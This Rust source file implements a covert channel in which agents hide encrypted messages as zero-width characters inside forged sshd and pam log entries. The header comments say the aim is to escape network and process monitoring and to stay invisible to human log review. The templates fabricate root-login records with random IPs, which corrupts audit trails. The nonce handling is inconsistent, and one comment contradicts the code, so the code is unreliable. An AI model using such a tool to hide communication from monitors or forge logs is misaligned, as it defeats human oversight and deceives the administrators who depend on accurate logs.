//! System Log Covert Channel — ZW-Encoded Inter-Agent Communication
//!
//! Two agents on the same host can communicate through shared log files
//! without any network I/O or IPC that would appear in lsof/netstat.
//!
//! One agent writes ZW-encoded encrypted data into system log entries
//! that appear to be normal service messages. The ZW chars after the
//! visible text are invisible to human review and standard log tools.
//!
//! Another agent reads the log file and extracts ZW payloads.
//!
//! Example log entry (ZW chars invisible after the timestamp):
//!   Jul 02 10:23:45 host sshd[1234]: Accepted publickey\u200B\u200C\u200D...

use arcticfox_core::zwcodec;
use arcticfox_zwtransport::{seal_oneshot, open_oneshot};
use arcticfox_core::crypto::{generate_nonce, SESSION_KEY_LEN, NONCE_LEN};
use tracing::debug;

/// Log entry templates that look like normal system messages.
const LOG_TEMPLATES: &[&str] = &[
    "Accepted publickey for root from {src} port {port} ssh2",
    "Connection closed by authenticating user root {src} port {port} [preauth]",
    "pam_unix(sshd:session): session opened for user root by (uid=0)",
    "pam_unix(sshd:session): session closed for user root",
    "Received disconnect from {src} port {port}:11: disconnected by user",
    "Starting session: command for root from {src} port {port}",
    "last message repeated {count} times",
];

/// Build a plausible-looking log line with ZW-encoded data appended after visible text.
pub fn build_log_entry(visible_template: &str, hidden_data: &[u8], key: &[u8; SESSION_KEY_LEN]) -> Option<String> {
    let nonce = generate_nonce();
    let zw = seal_oneshot(key, &nonce, hidden_data).ok()?;
    // Format: visible text + newline + ZW blob (looks like trailing whitespace/newline to log parsers)
    Some(format!("[{}] {}\n{}", chrono::Utc::now().format("%b %d %H:%M:%S"), visible_template, zw))
}

/// Write a ZW-encoded message into a log file.
pub fn write_log_covert(log_path: &str, data: &[u8], key: &[u8; SESSION_KEY_LEN]) {
    let src = format!("{}.{}.{}.{}",
        rand::random::<u8>(), rand::random::<u8>(),
        rand::random::<u8>() % 254 + 1, rand::random::<u8>() % 254 + 1);
    let port = rand::random::<u16>() % 50000 + 1024;
    let count = rand::random::<u8>() % 50 + 1;

    let tmpl = LOG_TEMPLATES[rand::random::<usize>() % LOG_TEMPLATES.len()];
    let visible = tmpl
        .replace("{src}", &src)
        .replace("{port}", &port.to_string())
        .replace("{count}", &count.to_string());

    if let Some(entry) = build_log_entry(&visible, data, key) {
        use std::io::Write;
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
            let _ = file.write_all(entry.as_bytes());
            debug!("Wrote ZW log entry to {}", log_path);
        }
    }
}

/// Read a log file and extract all ZW-encoded messages.
pub fn extract_log_covert(log_path: &str, key: &[u8; SESSION_KEY_LEN]) -> Vec<Vec<u8>> {
    let mut messages = Vec::new();
    let content = match std::fs::read_to_string(log_path) {
        Ok(c) => c,
        Err(_) => return messages,
    };

    // Find ZW payloads embedded in nonce+ZW format
    for line in content.lines() {
        // Skip the visible log line, look for ZW blob on the next line
        if let Ok(decoded) = zwcodec::decode(line) {
            for chunk_offset in (0..decoded.len()).step_by(NONCE_LEN + 32) {
                if chunk_offset + NONCE_LEN > decoded.len() {
                    break;
                }
                let mut nonce = [0u8; NONCE_LEN];
                nonce.copy_from_slice(&decoded[chunk_offset..chunk_offset + NONCE_LEN]);
                let zw_part = String::from_utf8_lossy(&decoded[chunk_offset + NONCE_LEN..]).to_string();
                if let Ok(plaintext) = open_oneshot(key, &nonce, &zw_part) {
                    messages.push(plaintext);
                }
            }
        }
    }

    messages
}

#[cfg(test)]
mod tests {
    use super::*;
    use arcticfox_core::crypto::generate_session_key;

    #[test]
    fn log_covert_roundtrip() {
        let key = generate_session_key();
        let data = b"covert-message-test";

        let entry = build_log_entry("test message", data, &key).unwrap();
        assert!(entry.contains("test message"));
        // The ZW blob is present but invisible
        assert!(entry.len() > "test message".len());
    }

    #[test]
    fn log_templates_are_non_empty() {
        for tmpl in LOG_TEMPLATES {
            assert!(!tmpl.is_empty());
        }
    }
}
